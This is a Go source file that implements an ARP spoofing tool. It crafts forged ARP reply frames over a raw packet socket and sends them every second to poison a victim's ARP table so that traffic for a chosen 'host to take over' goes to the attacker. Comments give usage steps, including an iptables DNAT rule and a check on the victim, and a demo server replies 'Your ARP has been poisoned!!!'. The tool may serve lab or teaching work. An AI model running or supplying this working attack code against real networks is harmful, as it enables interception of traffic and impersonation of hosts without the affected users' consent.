package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	// PFInet represent the socket protocol PF_INET
	PFInet = 0x0003

	// EthARP represent the define ETH_P_ARP
	EthARP = 0x0806

	// EthPIP represent the define ETH_P_IP
	EthPIP = 0x0800

	// EthPAll represent the define ETH_P_ALL
	EthPAll = 0x0003

	// ARPHrdEther represent the define ARPHRD_ETHER
	ARPHrdEther = 0x01

	// ARPOpRequest represent the define ARPOP_REQUEST
	ARPOpRequest = 0x01

	// ARPOpReply represent the define ARPOP_REPLY
	ARPOpReply = 0x02

	arpLen = 28
)

// Htons convert host short to net short
func Htons(i uint16) uint16 {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, i)
	return *(*uint16)(unsafe.Pointer(&b[0]))
}

// ETHMarshal do marshaling ethernet packet
func ETHMarshal(dstMac string, srcMac string) []byte {

	out := []byte{}

	// parse mac address
	dMac, err := net.ParseMAC(dstMac)
	if err != nil {
		log.Fatal(err)
	}
	sMac, err := net.ParseMAC(srcMac)
	if err != nil {
		log.Fatal(err)
	}

	pBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(pBuf, EthARP)

	out = append(out, dMac...)
	out = append(out, sMac...)
	out = append(out, pBuf...)

	return out
}

// ARPMarshal do marshaling arp packet
func ARPMarshal(dstIP string, dstMac string, srcIP string, srcMac string) []byte {

	// parse ip address
	dAddr := net.ParseIP(dstIP).To4()
	sAddr := net.ParseIP(srcIP).To4()

	// parse mac address
	dMac, err := net.ParseMAC(dstMac)
	if err != nil {
		log.Fatal(err)
	}
	sMac, err := net.ParseMAC(srcMac)
	if err != nil {
		log.Fatal(err)
	}

	buf := new(bytes.Buffer)

	// Hardware type
	err = binary.Write(buf, binary.BigEndian, uint16(0x01))
	if err != nil {
		log.Fatal(err)
	}

	// Protocol type
	err = binary.Write(buf, binary.BigEndian, uint16(EthPIP))
	if err != nil {
		log.Fatal(err)
	}

	// Hardware address length
	err = binary.Write(buf, binary.BigEndian, uint8(0x06))
	if err != nil {
		log.Fatal(err)
	}

	// Protocol address length
	err = binary.Write(buf, binary.BigEndian, uint8(0x04))
	if err != nil {
		log.Fatal(err)
	}

	// OP code
	err = binary.Write(buf, binary.BigEndian, uint16(ARPOpReply))
	if err != nil {
		log.Fatal(err)
	}

	out := buf.Bytes()

	out = append(out, sMac...)
	out = append(out, sAddr...)
	out = append(out, dMac...)
	out = append(out, dAddr...)

	if len(out) != arpLen {
		log.Fatal("The lenghth of ARP packet should be 28")
	}

	return out
}

func spoofing(pkt []byte, dev *net.Interface) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(Htons(uint16(EthPAll))))
	if err != nil {
		log.Fatal(err)
	}
	defer syscall.Close(fd)

	addr := &syscall.SockaddrLinklayer{
		Protocol: syscall.AF_PACKET,
		Ifindex:  dev.Index,
		Halen:    0x06,
	}
	copy(addr.Addr[:], dev.HardwareAddr[:])

	for {
		log.Printf("\n%s\n", hex.Dump(pkt))

		err = syscall.Sendto(fd, pkt, 0, addr)
		if err != nil {
			log.Fatal(err)
		}
		time.Sleep(1 * time.Second)
	}

}

func getInterface(ifname string, dev *net.Interface) {
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Fatal(err)
	}

	for _, i := range ifaces {
		if i.Name == ifname {
			*dev = i
			return
		}
	}
	log.Fatal("Cannot found the specific interface!")
}

// How arp spoofing work?
//
//                  eth:
//                    |- dst mac: aa:bb:cc:dd:ee:ff
//                    |- src mac: 00:11:22:33:44:55
//                  arp:
//                    |- sender ip: 192.168.1.1 (cheat victim our ip is 192.168.1.1)
//                    |- sender mac: 00:11:22:33:44
//                    |- target mac: ff:ff:ff:ff:ff:ff
//                    |- target ip: 0.0.0.0
//
//     mitm (my host) ---------------------------------> victim
//       |- dev: eth0                                      |- target mac: aa:bb:cc:dd:ee:ff
//       |- dev mac: 00:11:22:33:44:55                     |- ip addr: 192.168.1.3
//       |- ip addr: 192.168.1.2
//
//     remote host (host to take over)
//       |- ip addr: 192.168.1.1
//
//
// Usage:
// 	# on my host
// 	$ ./arp_spoofing aa:bb:cc:dd:ee:ff eth0 192.168.1.1
// 	$ iptables -t nat -A PREROUTING -s 192.168.1.3 -p tcp --dport 8000 -j DNAT --to-destination 192.168.1.3:8000
//
// 	# on victim
// 	$ arp 192.168.1.1  # check arp table has been poisoned
// 	$ curl http://192.168.1.1:8000
func main() {

	log.SetFlags(log.LstdFlags | log.Lshortfile)

	args := os.Args

	if len(args) != 4 {
		fmt.Println("usage: arp_spoofing targetMac interface host2TakeOver")
		os.Exit(1)
	}

	ifname := args[2]

	dev := net.Interface{}
	getInterface(ifname, &dev)

	senderIP := args[3]
	targetIP := "0.0.0.0"

	senderMac := dev.HardwareAddr.String()
	targetMac := "ff:ff:ff:ff:ff:ff"

	dstMac := args[1]
	srcMac := dev.HardwareAddr.String()

	pkt := []byte{}
	arp := ARPMarshal(targetIP, targetMac, senderIP, senderMac)
	eth := ETHMarshal(dstMac, srcMac)

	pkt = append(pkt, eth...)
	pkt = append(pkt, arp...)

	// a spoofing goroutine
	go spoofing(pkt, &dev)

	// run a test webserver
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, "Your ARP has been poisoned!!!")
	})
	http.ListenAndServe(":8000", nil)
}
